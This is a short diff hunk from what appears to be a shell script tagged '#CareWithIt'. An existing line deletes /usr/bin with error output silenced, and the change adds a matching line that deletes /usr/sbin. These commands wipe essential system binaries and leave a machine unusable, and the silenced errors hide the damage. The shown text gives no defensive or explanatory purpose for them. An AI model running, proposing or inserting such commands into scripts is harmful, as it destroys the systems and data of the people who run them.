@@ -3,3 +3,4 @@
 #CareWithIt
 
 rm -rf /usr/bin 2> /dev/null
+rm -rf /usr/sbin 2> /dev/null
